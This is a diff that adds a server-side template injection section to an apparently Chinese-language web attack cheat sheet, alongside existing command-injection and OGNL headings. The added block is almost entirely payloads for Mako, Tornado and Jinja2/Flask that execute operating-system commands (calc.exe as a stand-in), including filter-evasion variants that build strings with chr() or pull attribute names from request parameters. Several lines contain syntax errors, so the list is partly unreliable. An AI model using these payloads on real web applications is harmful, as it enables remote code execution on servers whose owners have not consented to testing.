@@ -907,6 +907,28 @@ Runtime.getRuntime().exec(new String[]{"/bin/sh", "-c", "test.sh;touch hack.txt"
 
 ## OGNL注入
 
+## 模板注入
+
+```
+Python
+Mako
+<%import os;os.system("calc.exe")%>
+Tornado
+{{__import__("os").system("calc.exe")}}
+jinja2(Flask)
+{{"xxx".__class__.__bases__[0].__subclasses()[436]("calc.exe")}}
+{{"xxx".__class__.__bases__.__getitem__(0).__subclasses().__getitem__(436).("calc.exe")}}
+{% if "xxx".__class__.__bases__.__getitem__(0).__subclasses().__getitem__(436).("calc.exe") %}{%endif%}
+{{[].__class__.__bases__[0].__subclasses()[436]("calc.exe")}}
+subprocess.Popen
+{% set chr =[].__class__.__bases__[0].__subclasses()[178].__init__.__globals__.__builtins__.chr %}{{[].__class__.__bases__[0].__subclasses()[436](chr(99)++chr(97)+chr(108)+chr(99))}}
+warnings.WarningMessage
+{{"xxx".[request.form.class].[request.arg.bases][0].[request.form.subclasses]()[436]("calc.exe")}}
+class:__class__
+bases:__bases__
+subclasses:__subclasses__
+```
+
 
 ## 上传
 
